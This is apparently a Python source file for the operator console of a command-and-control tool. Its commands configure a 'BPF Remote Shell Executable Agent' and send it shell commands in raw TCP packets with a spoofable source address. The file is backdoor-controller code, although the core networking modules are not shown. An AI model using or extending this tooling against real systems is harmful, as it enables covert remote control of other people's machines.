import c2.parse as c2parser
import shlex
from pathlib import Path
from cmd import Cmd
from c2.view import C2View
from c2.c2 import C2


class C2Cmd(Cmd):
    prompt = C2View.colored_text("BPF EXEC> ", "C9C9EE")

    def __init__(self, completekey="tab", stdin=None, stdout=None):
        super().__init__(completekey, stdin, stdout)
        self.c2: C2 = None

    def _add_common_opts(self, parser: c2parser.C2Parser) -> None:
        """Add common options to the parser."""
        parser.add_argument(
            "command",
            type=str,
            help="Shell command to send to the agent",
        )
        parser.add_argument(
            "--sip",
            type=str,
            help="Source IP address for the Raw packet (default: 8.8.8.8)",
            default="8.8.8.8",
        )
        parser.add_argument(
            "--dip",
            type=str,
            help="Destination IP address for the Raw packet",
            required=True,
        )
        parser.add_argument(
            "--sport",
            type=int,
            default=4444,
            help="Source port for the Raw packet (default: 4444)",
        )
        parser.add_argument(
            "--dport",
            type=int,
            default=4444,
            help="Destination port for the Raw packet (default: 4444)",
        )

    def do_tcp(self, arg: str) -> None:
        parser = c2parser.C2Parser(
            description="Send a raw TCP packet to the configured agent.",
            prog="tcp",
        )

        self._add_common_opts(parser)

        parser.add_argument(
            "--seq",
            type=int,
            default=5445,
            help="Sequence number for TCP Raw packet (default: 5445)",
        )

        try:
            tcp_args = parser.parse_args(shlex.split(arg))
        except c2parser.BadArgument:
            return
        self.c2.tcp_raw_send(tcp_args)

    def do_configure(self, arg: str) -> None:
        """Generates a new configured BPF Remote Shell Executable Agent. \nconfigure --name <agent_name> --output <outpath> --seq <sequence_number>"""
        parser = c2parser.C2Parser(
            description="Configure the BPF Remote Shell Executable Agent.",
            prog="configure",
        )

        parser.add_argument("--name", type=str, help="Name of the agent", required=True)
        parser.add_argument(
            "--output", type=str, help="Output file for the agent", default="."
        )
        parser.add_argument(
            "--seq",
            type=int,
            default=5445,
            help="Sequence number for tcp raw send",
        )

        try:
            config_args = parser.parse_args(shlex.split(arg))
        except c2parser.BadArgument:
            return
        self.c2.configure(config_args)

    def do_exit(self, arg: str) -> bool:
        """Exit the command loop."""
        parser = c2parser.C2Parser(description="Exit the command loop", prog="exit")
        try:
            parser.parse_args(shlex.split(arg))
        except c2parser.BadArgument:
            return
        self.c2.view.print_msg("Goodbye.")
        return True

    def do_help(self, arg):
        """List available commands with "help" or detailed help with "help cmd"."""
        parser = c2parser.C2Parser(
            description="Shows all available commands", prog="help"
        )
        try:
            parser.parse_args(shlex.split(arg))
        except c2parser.BadArgument:
            return

        names = self.get_names()
        self.c2.view.print_msg(
            "Type <command> --help for more information on a specific command.\n"
        )
        self.c2.view.print_msg("Available commands:")
        for name in names:
            if name.startswith("do_"):
                cmd_name = name[3:]
                self.c2.view.print_msg(f"  {cmd_name}")
